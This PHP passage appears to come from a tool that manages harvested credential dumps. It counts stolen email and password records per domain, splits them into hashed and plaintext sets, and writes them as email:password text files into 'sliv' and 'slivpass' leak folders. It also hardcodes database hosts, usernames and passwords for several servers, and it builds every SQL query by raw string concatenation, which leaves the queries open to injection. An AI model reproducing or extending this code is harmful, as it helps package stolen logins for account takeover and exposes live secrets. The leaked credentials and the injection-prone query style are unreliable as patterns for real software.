			$lastCountMail = $d['renders']['lastCountMail'];
			$statusNoHash = $d['renders']['statusNoHash'];
			$statusHash = $d['renders']['statusHash'];
			$statusMail = $d['renders']['statusMail'];
			$z = $domen;
			$data1tmp = $this->Filed->query('SELECT count(domen)  FROM  `mails` WHERE `domen` =\'' . $domen . '\' GROUP BY `domen` order by count(domen) DESC limit 0,1');
			$raz = $data1tmp[0][0]['count(domen)'] - $countMail;
			$this->d($raz, 'raz');
			$this->d($data1tmp[0][0]['count(domen)'], '$countMail _NEW!!');
			$this->d($countMail, 'countMail_OLD');

			if ($this->raz < $raz) {
				$p[$z]['randPass'] = $this->Filed->query('SELECT `pass` FROM  `mails` WHERE `domen` = \'' . $z . '\' AND pass !=\'0\' order by rand() limit 3');
				$p[$z]['country'] = $this->Filed->query('SELECT `country` FROM  `fileds` WHERE  `post_id` = (select id from `posts` WHERE `domen` = \'' . $domen . '\' limit 0,1) limit 0,1');
				$p[$z]['category'] = $this->Filed->query('SELECT `category` FROM  `fileds` WHERE  `post_id` = (select id from `posts` WHERE `domen` = \'' . $domen . '\' limit 0,1) limit 0,1');
				$p[$z]['post_id'] = $this->Filed->query('SELECT `post_id` FROM  `fileds` WHERE  `post_id` = (select id from `posts` WHERE `domen` = \'' . $domen . '\' limit 0,1) limit 0,1');
				$p[$z]['date'] = $this->Filed->query('SELECT date FROM  `mails` WHERE `domen` = \'' . $z . '\' group by date limit 0,1');
				$p[$z]['post_id'] = $p[$z]['post_id'][0]['fileds']['post_id'];
				$p[$z]['category'] = $p[$z]['category'][0]['fileds']['category'];
				$p[$z]['country'] = $p[$z]['country'][0]['fileds']['country'];
				$p[$z]['date'] = $p[$z]['date'][0]['mails']['date'];

				if ($p[$z]['category'] == '') {
					$p[$z]['category'] = '0';
				}


				if ($p[$z]['country'] == '') {
					$p[$z]['country'] = '0';
				}


				if ($p[$z]['post_id'] == '') {
					$p[$z]['post_id'] = '0';
				}


				$p[$z]['category'] = str_replace('/', '-', $p[$z]['category']);
				$strPassTmp = '';

				foreach ($p[$z]['randPass'] as $passTmp0 ) {
					$strPassTmp .= $passTmp0['mails']['pass'] . '<br>';
				}

				$p[$z]['randPass'] = $strPassTmp;
				$countAll = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `domen` = \'' . $z . '\' ');
				$countAll = $countAll[0][0]['count(*)'];
				$counthash2 = $this->Filed->query('SELECT count(pass) FROM  `mails` WHERE `domen` = \'' . $domen . '\' AND `hashtype` !=\'0\' AND `pass` !=\'0\'');
				$countNoHash2 = $this->Filed->query('SELECT count(pass) FROM  `mails` WHERE `domen` = \'' . $domen . '\' AND `hashtype` =\'0\' AND `pass` !=\'0\'');
				$p[$z]['countHash'] = $counthash2[0][0]['count(pass)'];
				$p[$z]['countNoHash'] = $countNoHash2[0][0]['count(pass)'];
				$this->d($p[$z]['countHash'], 'countHash_NEW!!');
				$this->d($countHash, 'countHash_OLD!!');
				$this->d($p[$z]['countNoHash'], 'countNoHash_NEW!!');
				$this->d($countNoHash, 'countNoHash_OLD!!');
				$count1 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `domen` = \'' . $domen . '\' AND pass !=\'0\'');
				$p[$z]['countPass'] = $count1[0][0]['count(*)'];
				$this->d($p[$z]['countPass'], 'countPass_NEW!!');
				$count2 = $data = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE domen = \'' . $domen . '\'');
				$p[$z]['countMail'] = $count2[0][0]['count(*)'];
				$this->d($p[$z]['countMail'], 'countMail_NEW!!');
				$count3 = $data = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE domen = \'' . $domen . '\' AND pass=\'0\'');
				$p[$z]['countMailnoPass'] = $count3[0][0]['count(*)'];
				$this->d($p[$z]['countMailnoPass'], 'countMailnoPass_NEW!!');
				$all = '';
				$all .= $domen;

				if (1 <= $p[$z]['countPass']) {
				}


				$all = '/slivpass/' . $all . '.txt';
				$this->d($all, 'all');

				if ($countAll < $this->lim2) {
					echo 'countAll <' . $this->lim2 . '<br>';
					$fh = fopen('.' . $all, 'w+');

					if ($fh) {
						$this->d('$all - otkrit KAK NOVYI FILE');
					}


					$limitYes = false;
					$data0 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND `pass` !=\'0\' AND hashtype =\'0\'');
					$z0 = '';

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}

					$stop = $this->get_time();
					$this->d($stop - $start, 'countNoHASH');
					$data1 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = \'' . $z . '\' AND pass !=\'0\' AND hashtype !=\'0\' ');
					$z1 = '';

					foreach ($data1 as $d ) {
						$z1 .= $d['mails']['email'];
						$z1 .= ':';
						$z1 .= $d['mails']['pass'];
						$z1 .= "\r\n";
					}

					$stop1 = $this->get_time();
					$this->d($stop1 - $start, 'countHash');
					$data2 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND `pass` =\'0\'');
					$stop = $this->get_time();
					$z2 = '';

					foreach ($data2 as $d2 ) {
						$z2 .= $d2['mails']['email'];
						$z2 .= "\r\n";
					}

					$stop2 = $this->get_time();
					$this->d($stop2 - $start, 'MAIL');
				}
				 else {
					echo 'countAll >' . $this->lim2 . '<br>';
					$fh = fopen('.' . $download, 'a+');

					if ($fh) {
						$this->d('$all - otkrit na dokachku');
					}


					$limitYes = true;

					if ($countNoHash < $p[$z]['countNoHash']) {
						$ht = 'pass !=\'0\' AND hashtype =\'0\'';
						echo 'Dokachka lastCountNoHash<br>';

						if ($this->lim < ($p[$z]['countNoHash'] - $lastCountNoHash)) {
							$limitNoHash = $this->lim;
						}
						 else {
							$limitNoHash = $p[$z]['countNoHash'] - $lastCountNoHash;
						}

						$data0 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND ' . $ht . ' limit ' . $lastCountNoHash . ',' . $limitNoHash);
						$this->d('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND ' . $ht . ' limit ' . $lastCountNoHash . ',' . $limitNoHash);
						$z0 = '';

						foreach ($data0 as $d ) {
							$z0 .= $d['mails']['email'];
							$z0 .= ':';
							$z0 .= $d['mails']['pass'];
							$z0 .= "\r\n";
						}

						$next = $lastCountNoHash + $limitNoHash;
						$this->Post->query('UPDATE `renders` SET ' . "\r\n\t\t\t\t\t\t" . '`lastCountNoHash`=' . $next . "\r\n\t\t\t\t\t\t" . 'WHERE `domen` = \'' . $domen . '\'');
						$stop = $this->get_time();
						echo $stop - $start;
					}


					$this->d(1);
					$this->d($limitNoHash, 'limitNoHash');
					$this->d($lastCountNoHash, 'lastCountNoHash');

					if ($countHash < $p[$z]['countHash']) {
						$ht = '`pass` !=\'0\' AND `hashtype` !=\'0\'';
						echo 'Dokachka lastCountHash<br>';

						if ($this->lim < ($p[$z]['countHash'] - $lastCountHash)) {
							$limitHash = $this->lim;
						}
						 else {
							$limitHash = $p[$z]['countHash'] - $lastCountHash;
						}

						$data1 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND ' . $ht . ' limit ' . $lastCountHash . ',' . $limitHash);
						$this->d('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND ' . $ht . ' limit ' . $lastCountHash . ',' . $limitHash);
						$z1 = '';

						foreach ($data1 as $d ) {
							$z1 .= $d['mails']['email'];
							$z1 .= ':';
							$z1 .= $d['mails']['pass'];
							$z1 .= "\r\n";
						}

						$next = $lastCountHash + $limitHash;
						$this->Post->query('UPDATE `renders` SET ' . "\r\n\t\t\t\t\t\t" . '`lastCountHash`=' . $next . "\r\n\t\t\t\t\t\t" . 'WHERE `domen` = \'' . $domen . '\'');
						$stop = $this->get_time();
						echo $stop - $start;
					}


					$this->d(2);
					$this->d($limitHash, 'limitHash');
					$this->d($lastCountHash, 'lastCountHash');

					if ($countMail < $p[$z]['countMail']) {
						$ht = 'pass =\'0\'';
						echo 'Dokachka lastCountMail<br>';

						if ($this->lim < ($p[$z]['countMailnoPass'] - $lastCountMail)) {
							$limitMail = $this->lim;
						}
						 else {
							$limitMail = $p[$z]['countMailnoPass'] - $lastCountMail;
						}

						$data2 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND ' . $ht . ' limit ' . $lastCountMail . ',' . $limitMail);
						$this->d('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND ' . $ht . ' limit ' . $lastCountMail . ',' . $limitMail);
						$z2 = '';

						foreach ($data2 as $d ) {
							$z2 .= $d['mails']['email'];
							$z2 .= "\r\n";
						}

						$next = $lastCountMail + $limitMail;
						$this->Post->query('UPDATE `renders` SET ' . "\r\n\t\t\t\t\t\t" . '`lastCountMail`=' . $next . "\r\n\t\t\t\t\t\t" . 'WHERE `domen` = \'' . $domen . '\'');
						$stop = $this->get_time();
						echo $stop - $start;
					}


					$this->d(3);
					$this->d($limitMail, 'limitMail');
					$this->d($lastCountMail, 'lastCountMail');
				}

				$str = $z0 . $z1 . $z2;
				$this->Post->query('UPDATE `renders` SET ' . "\r\n\t\t\t\t" . '`countMail`=' . $p[$z]['countMail'] . ',' . "\r\n\t\t\t\t" . '`countPass`=' . $p[$z]['countPass'] . ',' . "\r\n\t\t\t\t" . '`countHash`=' . $p[$z]['countHash'] . ',' . "\r\n\t\t\t\t" . '`countNoHash`=' . $p[$z]['countNoHash'] . ',' . "\r\n\t\t\t\t" . '`download`="' . $all . '" ' . "\r\n\t\t\t\t" . 'WHERE `domen`="' . $domen . '" ');
				fwrite($fh, $str);
				fclose($fh);
				$this->d($download, 'staryi');
				$this->d($all, 'novyi');
				if (file_exists('.' . $all) && ($limitYes != true)) {
					@unlink('.' . $download);
					echo '.' . $download . '<br>';
				}


				if (($limitYes == true) && file_exists('.' . $all)) {
					$this->d('limitYes = yes - pereimenovivaem');
					@rename('.' . $download, '.' . $all);
				}

			}

		}

		$stop = $this->get_time();
		$this->d($stop - $start, 'END');
		$this->stop();
		exit();
	}

	public function rendown_one()
	{
		$this->timeStart = $this->start('rendown_one', 1);
		$this->s();
		$str1 = '';
		$str11 = '';
		$str12 = '';
		$data10tmp = $this->Filed->query('select `post_id` FROM `fileds` WHERE `get` =\'1\'  AND `password` =\':\' GROUP BY `post_id`');
		$this->d('select post_id FROM `fileds` WHERE `get`=\'1\'  AND `password` =\':\' GROUP BY post_id');
		$this->d($data10tmp, 'НАХОДИМ КАКИЕ НЕ НАДО ПОКА ЧТО СКАЧИВАТЬ В ФАЙЛ НИЖЕ');
		$i10 = 0;

		foreach ($data10tmp as $tmp10 ) {
			$k = trim($tmp10['fileds']['post_id']);
			$str11 .= ' `post_id` !=\'' . $k . '\' AND';
			$data11tmp = $this->Filed->query('select `url` FROM `posts` WHERE `id`=' . $k);
			$this->d($data11tmp, '$data11tmp host iz posts');
			$data11tmp[0]['posts']['url'] = str_replace('http://', '', $data11tmp[0]['posts']['url']);
			$data11tmp[0]['posts']['url'] = 'http://' . $data11tmp[0]['posts']['url'];
			$url = parse_url($data11tmp[0]['posts']['url']);
			$str12 .= ' `domen` !=\'' . $url['host'] . '\' AND';
			++$i10;
		}

		if ($i10 != 1) {
			$str11 = substr($str11, 0, strlen($str11) - 3);
		}


		$str12 = substr($str12, 0, strlen($str12) - 3);
		$this->d($str11, '$str11');
		$this->d($str12, '$str12');
		$data0tmp = $this->Filed->query('select * FROM `renders_one`  WHERE ' . $str11 . ' `statusMail` = 3 limit 1');
		$this->d('select * FROM `renders_one` WHERE ' . $str11 . ' `statusMail` = 3 limit 1');
		$this->d($data0tmp, 'data0tmp - STATUS 3');

		if ($data0tmp[0]['renders_one']['id'] != 0) {
			echo '!!!!!!!!est status 3!!!!!!!!<br>';

			foreach ($data0tmp as $tmp0 ) {
				$k = trim($tmp0['renders_one']['domen']);
				$str1 .= ' `domen` !=\'' . $k . '\' AND';
			}

			$str1 = substr($str1, 0, strlen($str1) - 3);

			if (3 < strlen($str1)) {
				$str1 = 'WHERE ' . $str1;
			}
			 else {
				$str1 = '';
			}

			$dok = true;
		}
		 else {
			echo '!!!!!!!!!rabotaem po status 2!!!!!!!!!!!!<br>';
			$dok = false;
			$data0tmp = $this->Filed->query('select * FROM `renders_one` WHERE `statusMail` = 2');
			$this->d($data0tmp, 'data0tmp - STATUS 2');
			$str1 = '';

			foreach ($data0tmp as $tmp0 ) {
				$k = trim($tmp0['renders_one']['domen']);
				$str1 .= ' `domen` !=\'' . $k . '\' AND';
			}

			$str1 = substr($str1, 0, strlen($str1) - 3);

			if (3 < strlen($str1)) {
				$str1 = 'WHERE ' . $str1;
			}
			 else {
				$str1 = '';
			}
		}

		$this->d($str1, 'str1 STATUS 2');

		if ($str12 != '') {
			if (3 < strlen($str1)) {
				$str1 = $str1 . ' AND ';
				$str2 = 'SELECT `domen`  FROM  `mails_one` ' . $str1 . ' ' . $str12 . ' GROUP BY `domen` order by count(domen) DESC limit 0,1';
			}
			 else {
				$str2 = 'SELECT `domen`  FROM  `mails_one` WHERE ' . $str12 . ' GROUP BY `domen` order by count(domen) DESC limit 0,1';
			}
		}
		 else {
			$str2 = 'SELECT `domen`  FROM  `mails_one` ' . $str1 . ' GROUP BY `domen` order by count(domen) DESC limit 0,1';
		}

		$data1tmp = $this->Filed->query($str2);
		$this->d($str1, 'str1');
		$this->d($str2, 'str2');
		$this->d($data1tmp, '$data1tmp');
		$this->p('pred_viborka');
		flush();
		$p = array();

		foreach ($data1tmp as $d ) {
			$z = $d['mails_one']['domen'];
			$domen = $z;
			$p[$z]['country'] = $this->Filed->query('SELECT `country` FROM  `fileds` WHERE  `post_id` = (select `id` from `posts` WHERE `domen`= \'' . $domen . '\' limit 0,1) limit 0,1');
			$p[$z]['category'] = $this->Filed->query('SELECT `category` FROM  `fileds` WHERE  `post_id` = (select `id` from `posts` WHERE `domen`= \'' . $domen . '\' limit 0,1) limit 0,1');
			$p[$z]['post_id'] = $this->Filed->query('select `id` FROM `posts` WHERE `domen` = \'' . $domen . '\' limit 0,1');
			$this->d($p[$z]['post_id'], '$p[$z][post_id] ');
			$this->d('select `id` FROM `posts` WHERE `domen` = \'' . $domen . '\' limit 0,1');
			$p[$z]['date'] = $this->Filed->query('SELECT `date` FROM  `mails_one` WHERE `domen` = \'' . $z . '\' group by `date` limit 0,1');
			$p[$z]['post_id'] = $p[$z]['post_id'][0]['posts']['id'];
			$p[$z]['category'] = $p[$z]['category'][0]['fileds']['category'];
			$p[$z]['country'] = $p[$z]['country'][0]['fileds']['country'];
			$p[$z]['date'] = $p[$z]['date'][0]['mails_one']['date'];

			if ($p[$z]['category'] == '') {
				$p[$z]['category'] = '0';
			}


			if ($p[$z]['country'] == '') {
				$p[$z]['country'] = '0';
			}


			$p[$z]['category'] = str_replace('/', '-', $p[$z]['category']);
			$this->d($p, 'pppppppppppppppppppp');
			$countAll = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE `domen` = \'' . $z . '\' ');
			$countAll = $countAll[0][0]['count(*)'];
			$this->d($countAll, '$countAll');

			if (($countAll < $this->delete) && ($countAll != 0)) {
				$this->Filed->query('DELETE FROM `mails_one` WHERE `domen` = \'' . $z . '\'');
				$this->d($z, 'DELETE iz vtoroy proverki');
				$this->logs('DELETE ' . $z . ' udalen iz mails < ' . $this->delete, 'rendown_one');
			}


			$count2 = $data = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE `domen` = \'' . $domen . '\'');
			$p[$z]['countMail'] = $count2[0][0]['count(*)'];
			$this->d($p[$z]['countMail'], 'countMail!!!!!');
			$count3 = $data = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE `domen` = \'' . $domen . '\' AND `pass` =\'0\'');
			$p[$z]['countMailnoPass'] = $count3[0][0]['count(*)'];
			$this->d($p[$z]['countMailnoPass'], 'countMailnoPass!!!!!');
			$data0tmp = $this->Filed->query('SELECT * FROM  `renders_one` WHERE `domen` = \'' . $domen . '\'');
			$lastCountMail = $data0tmp[0]['renders_one']['lastCountMail'];
			$statusMail = $data0tmp[0]['renders_one']['statusMail'];

			if (!(isset($lastCountMail))) {
				$lastCountMail = 0;
			}


			if (!(isset($statusMail))) {
				$statusMail = 2;
			}


			$this->d($lastCountMail, '$lastCountMail');
			$this->d($statusMail, '$statusMail');
			flush();
			$all = '';
			$all .= $domen;
			$all = '/sliv/' . $all . '.txt';
			$this->d($all, 'all');
			$this->p('Do osnovnyh viborok');
			flush();

			if ($countAll < $this->lim2) {
				echo 'countAll <' . $this->lim2 . '<br>';
				$data2 = $this->Filed->query('SELECT `zona`,`email`,`domen` FROM  `mails_one` WHERE `domen` = \'' . $z . '\'');
				$stop = $this->get_time();
				$z2 = '';

				foreach ($data2 as $d2 ) {
					$z2 .= $d2['mails_one']['email'];
					$z2 .= "\r\n";
				}

				$stop2 = $this->get_time();
				echo $stop2 - $start;
			}
			 else {
				$limitYes = true;
				echo 'countAll >' . $this->lim2 . '<br>';

				if (($dok == false) && ($lastCountMail == 0)) {
					echo 'dok == FALSE AND lastCountMail<br>';

					if ($this->lim < $p[$z]['countMailnoPass']) {
						$limitMail = $this->lim;
						$statusMail = 3;
					}
					 else {
						$limitMail = $p[$z]['countMailnoPass'];
						$statusMail = 2;
					}

					$data2 = $this->Filed->query('SELECT zona,email,domen FROM  `mails_one` WHERE `domen` = \'' . $z . '\'  limit 0,' . $limitMail);
					$this->d('SELECT zona,email,domen FROM  `mails` WHERE `domen` = \'' . $z . '\'  limit 0,' . $limitMail);
					$z2 = '';

					foreach ($data2 as $d ) {
						$z2 .= $d['mails_one']['email'];
						$z2 .= "\r\n";
					}
				}
				 else if ($statusMail == 3) {
					$ht = 'pass =\'0\'';
					echo 'Dokachka lastCountMail<br>';

					if ($this->lim < ($p[$z]['countMailnoPass'] - $lastCountMail)) {
						$limitMail = $this->lim;
						$statusMail = 3;
					}
					 else {
						$limitMail = $p[$z]['countMailnoPass'] - $lastCountMail;
						$statusMail = 2;
					}

					$data2 = $this->Filed->query('SELECT zona,email,domen FROM  `mails_one` WHERE `domen` = \'' . $z . '\' limit ' . $lastCountMail . ',' . $limitMail);
					$this->d('SELECT zona,email,domen FROM  `mails_one` WHERE `domen` = \'' . $z . '\' limit ' . $lastCountMail . ',' . $limitMail);
					$z2 = '';

					foreach ($data2 as $d ) {
						$z2 .= $d['mails_one']['email'];
						$z2 .= "\r\n";
					}

					$next = $lastCountMail + $limitMail;
					$this->Post->query('UPDATE `renders_one` SET ' . "\r\n\t\t\t\t\t\t" . '`statusMail`=' . $statusMail . ',' . "\r\n\t\t\t\t\t\t" . '`lastCountMail`=' . $next . "\r\n\t\t\t\t\t\t" . 'WHERE `domen` = \'' . $domen . '\'');
				}


				$this->p('Mail_time');
				$this->d('3');
				$this->d($limitMail, 'limitMail');
				$this->d($statusMail, 'statusMail');
				$this->d($lastCountMail, 'lastCountMail');
				flush();
			}

			$str = $z0 . $z1 . $z2;
			$fh = fopen('.' . $all, 'a+');
			fwrite($fh, $str);
			fclose($fh);
			flush();
			$fieldcount = $this->Post->query('SELECT * FROM  `renders_one` WHERE  `domen` =\'' . $domen . '\'');

			if (0 < count($fieldcount)) {
				continue;
			}


			if ($limitYes == true) {
				$this->d('limitYes zapis v bazu');
				$this->Post->query('INSERT INTO renders_one (' . "\r\n\t\t\t" . '`post_id`,' . "\r\n\t\t\t" . '`domen`,' . "\r\n\t\t\t" . '`countMail`,' . "\r\n\t\t\t" . '`download`,' . "\r\n\t\t\t" . '`statusMail`,' . "\r\n\t\t\t" . '`lastCountMail`,' . "\r\n\t\t\t" . '`date`,' . "\r\n\t\t\t" . '`category`,' . "\r\n\t\t\t" . '`country`) ' . "\r\n\t\t\t\r\n\t\t\t" . 'VALUES(' . "\r\n\t\t\t" . '\'' . $p[$z][post_id] . '\',' . "\r\n\t\t\t" . '\'' . $domen . '\',' . "\r\n\t\t\t" . $p[$z][countMail] . ',' . "\r\n\t\t\t" . '\'' . $all . '\',' . "\r\n\t\t\t" . $statusMail . ',' . "\r\n\t\t\t" . $limitMail . ',' . "\r\n\t\t\t" . '\'' . $p[$z][date] . '\',' . "\r\n\t\t\t" . '\'' . $p[$z][category] . '\',' . "\r\n\t\t\t" . '\'' . $p[$z][country] . '\')');
			}
			 else {
				$this->d('limit < 500000 zapis v bazu');
				$this->Post->query('INSERT INTO renders_one (' . "\r\n\t\t\t" . '`post_id`,' . "\r\n\t\t\t" . '`domen`,' . "\r\n\t\t\t" . '`countMail`,' . "\r\n\t\t\t" . '`download`,' . "\r\n\t\t\t" . '`statusMail`,' . "\r\n\t\t\t" . '`lastCountMail`,' . "\r\n\t\t\t" . '`date`,' . "\r\n\t\t\t" . '`category`,' . "\r\n\t\t\t" . '`country`) ' . "\r\n\t\t\t\r\n\t\t\t" . 'VALUES(' . "\r\n\t\t\t" . '\'' . $p[$z][post_id] . '\',' . "\r\n\t\t\t" . '\'' . $domen . '\',' . "\r\n\t\t\t" . $p[$z][countMail] . ',' . "\r\n\t\t\t" . '\'' . $all . '\',' . "\r\n\t\t\t" . '2,' . "\r\n\t\t\t" . '0,' . "\r\n\t\t\t" . '\'' . $p[$z][date] . '\',' . "\r\n\t\t\t" . '\'' . $p[$z][category] . '\',' . "\r\n\t\t\t" . '\'' . $p[$z][country] . '\')');
			}
		}

		$this->p('END_TIME');
		$this->stop();
		exit();
	}

	public function rendown_one2()
	{
		$this->timeStart = $this->start('rendown_one2', 1);
		$start = $this->get_time();
		$str1 = '';
		$str11 = '';
		$data10tmp = $this->Filed->query('select post_id FROM `fileds` WHERE get=\'1\' GROUP BY post_id');
		$this->d('select post_id FROM `fileds` WHERE get=\'1\' GROUP BY post_id');
		$this->d($data10tmp);
		$i10 = 0;

		foreach ($data10tmp as $tmp10 ) {
			$k = trim($tmp10['fileds']['post_id']);
			$str11 .= ' `post_id` =' . $k . ' or';
			++$i10;
		}

		$str11 = substr($str11, 0, strlen($str11) - 3);
		$this->d($str11, '$str11');

		if ($str11 != '') {
			$str11 = ' AND (' . $str11 . ')';
		}


		$data0tmp = $this->Filed->query('select * FROM `renders_one` WHERE  `statusMail` = 2 ' . $str11);
		$this->d('select * FROM `renders_one` WHERE  `statusMail` = 2 ' . $str11);
		$this->d($data0tmp, '$data0tmp');

		if (count($data0tmp) == 0) {
			$data0tmp = $this->Filed->query('select * FROM `renders_one` WHERE  `statusMail` = 2 AND countMail > 10000');
			$this->d('select * FROM `renders_one` WHERE  `statusMail` = 2 AND `countMail` > 10000');
			$this->d($data0tmp, '$data0tmp');
		}


		foreach ($data0tmp as $d ) {
			$this->d($d);
			$domen = $d['renders_one']['domen'];
			$countMail = $d['renders_one']['countMail'];
			$country = $d['renders_one']['country'];
			$category = $d['renders_one']['category'];
			$download = $d['renders_one']['download'];
			$lastCountMail = $d['renders_one']['lastCountMail'];
			$statusMail = $d['renders_one']['statusMail'];
			$z = $domen;
			$data1tmp = $this->Filed->query('SELECT count(domen)  FROM  `mails_one` WHERE `domen` =\'' . $domen . '\' GROUP BY domen order by count(domen) DESC limit 0,1');
			$raz = $data1tmp[0][0]['count(domen)'] - $countMail;
			$this->d($raz, 'raz');
			$this->d($data1tmp[0][0]['count(domen)'], '$countMail _NEW!!');
			$this->d($countMail, 'countMail_OLD');

			if ($this->raz < $raz) {
				$p[$z]['country'] = $this->Filed->query('SELECT `country` FROM  `fileds` WHERE  `post_id` = (select id from `posts` WHERE `domen` = \'' . $domen . '\' limit 0,1) limit 0,1');
				$p[$z]['category'] = $this->Filed->query('SELECT `category` FROM  `fileds` WHERE  `post_id` = (select id from `posts` WHERE `domen` = \'' . $domen . '\'\' limit 0,1) limit 0,1');
				$p[$z]['post_id'] = $this->Filed->query('SELECT `post_id` FROM  `fileds` WHERE  `post_id` = (select id from `posts` WHERE `domen` = \'' . $domen . '\' limit 0,1) limit 0,1');
				$p[$z]['date'] = $this->Filed->query('SELECT date FROM  `mails_one` WHERE `domen` = \'' . $z . '\' group by date limit 0,1');
				$p[$z]['post_id'] = $p[$z]['post_id'][0]['fileds']['post_id'];
				$p[$z]['category'] = $p[$z]['category'][0]['fileds']['category'];
				$p[$z]['country'] = $p[$z]['country'][0]['fileds']['country'];
				$p[$z]['date'] = $p[$z]['date'][0]['mails_one']['date'];

				if ($p[$z]['category'] == '') {
					$p[$z]['category'] = '0';
				}


				if ($p[$z]['country'] == '') {
					$p[$z]['country'] = '0';
				}


				if ($p[$z]['post_id'] == '') {
					$p[$z]['post_id'] = '0';
				}


				$p[$z]['category'] = str_replace('/', '-', $p[$z]['category']);
				$countAll = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE `domen` = \'' . $z . '\' ');
				$countAll = $countAll[0][0]['count(*)'];
				$this->d($countAll, '$countAll domen v mails_one');
				$count2 = $data = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE domen = \'' . $domen . '\'');
				$p[$z]['countMail'] = $count2[0][0]['count(*)'];
				$this->d($p[$z]['countMail'], 'countMail_NEW!!');
				$count3 = $data = $this->Filed->query('SELECT count(*) FROM  `mails_one` WHERE domen = \'' . $domen . '\' AND pass=\'0\'');
				$p[$z]['countMailnoPass'] = $count3[0][0]['count(*)'];
				$this->d($p[$z]['countMailnoPass'], 'countMailnoPass_NEW!!');
				$all = '';
				$all .= $domen;
				$all = '/sliv/' . $all . '.txt';
				$this->d($all, 'all');

				if ($countAll < $this->lim2) {
					echo 'countAll <' . $this->lim2 . '<br>';
					$fh = fopen('.' . $all, 'w+');

					if ($fh) {
						$this->d('$all - otkrit KAK NOVYI FILE');
					}


					$limitYes = false;
					$data2 = $this->Filed->query('SELECT zona,email,domen FROM  `mails_one` WHERE `domen` = \'' . $z . '\'');
					$stop = $this->get_time();
					$z2 = '';

					foreach ($data2 as $d2 ) {
						$z2 .= $d2['mails_one']['email'];
						$z2 .= "\r\n";
					}

					$stop2 = $this->get_time();
					$this->d($stop2 - $start, 'MAIL');
				}
				 else {
					echo 'countAll >' . $this->lim2 . '<br>';
					$fh = fopen('.' . $download, 'a+');

					if ($fh) {
						$this->d('$all - otkrit na dokachku');
					}


					$limitYes = true;

					if ($countMail < $p[$z]['countMail']) {
						echo 'Dokachka lastCountMail<br>';

						if ($this->lim < ($p[$z]['countMailnoPass'] - $lastCountMail)) {
							$limitMail = $this->lim;
						}
						 else {
							$limitMail = $p[$z]['countMailnoPass'] - $lastCountMail;
						}

						$data2 = $this->Filed->query('SELECT zona,email,domen FROM  `mails_one` WHERE `domen` = \'' . $z . '\'  limit ' . $lastCountMail . ',' . $limitMail);
						$this->d('SELECT zona,email,domen FROM  `mails_one` WHERE `domen` = \'' . $z . '\'  limit ' . $lastCountMail . ',' . $limitMail);
						$z2 = '';

						foreach ($data2 as $d ) {
							$z2 .= $d['mails_one']['email'];
							$z2 .= "\r\n";
						}

						$next = $lastCountMail + $limitMail;
						$this->Post->query('UPDATE `renders_one` SET ' . "\r\n\t\t\t\t\t\t" . '`lastCountMail`=' . $next . "\r\n\t\t\t\t\t\t" . 'WHERE `domen` = \'' . $domen . '\'');
						$stop = $this->get_time();
						echo $stop - $start;
					}


					$this->d(3);
					$this->d($limitMail, 'limitMail');
					$this->d($lastCountMail, 'lastCountMail');
				}

				$str = $z0 . $z1 . $z2;
				$this->Post->query('UPDATE `renders_one` SET ' . "\r\n\t\t\t\t" . '`countMail`=' . $p[$z]['countMail'] . ',' . "\r\n\t\t\t\t" . '`download`="' . $all . '" ' . "\r\n\t\t\t\t" . 'WHERE `domen`="' . $domen . '" ');
				fwrite($fh, $str);
				fclose($fh);
				$this->d($download, 'staryi');
				$this->d($all, 'novyi');
				if (file_exists('.' . $all) && ($limitYes != true)) {
					@unlink('.' . $download);
					echo '.' . $download . '<br>';
				}


				if (($limitYes == true) && file_exists('.' . $all)) {
					$this->d('limitYes = yes - pereimenovivaem');
					@rename('.' . $download, '.' . $all);
				}

			}

		}

		$stop = $this->get_time();
		$this->d($stop - $start, 'END');
		$this->stop();
		exit();
	}

	public function psn2()
	{
		$time = time();
		$this->r = rand(1, 100);
		echo $_SERVER['SERVER_NAME'] . '<br>';

		if ($_SERVER['SERVER_NAME'] == 'alex') {
			$hostname = '5.152.201.130';
			$username = 'parsergoogle';
			$password = 'Becon99';
			$dbname = 'parsergoogle';
		}
		 else if ($_SERVER['SERVER_NAME'] == 'old.innocentds.co.ua') {
			$hostname = '91.239.233.90';
			$username = 'oldbot_user';
			$password = 'W9N8REfp';
			$dbname = 'app1_system';
		}
		 else if ($_SERVER['SERVER_NAME'] == 'shell3.com') {
			$hostname = '5.152.201.130';
			$username = 'parsergoogle';
			$password = 'Becon99';
			$dbname = 'parsergoogle';
		}


		if (!($this->connection = @mysql_connect($hostname, $username, $password))) {
			exit('<div style=\'font-size:16px; margin-top:40px;\'>Вероятно Вы указали неверные данные для коннекта к базе данных. Проверьте корректность данных а файле conf.php</div>');
		}
		 else {
			$this->d('connect ok');
		}

		mysql_select_db($dbname, $this->connection) || exit(mysql_error() . ' Error no:' . mysql_errno());
		mysql_query('SET NAMES \'utf8\'', $this->connection);

		if (!($this->start2())) {
			exit('true netu(');
		}


		$this->timeStart = $this->start('psn', 1);
		$urls = $this->Post->query('SELECT * FROM `posts` WHERE `status`=0');

		if (count($urls) < 15) {
			$this->Post->query('DELETE FROM `posts` WHERE `status` =0');
		}
		 else {
			$this->stop();
			$this->stop2();
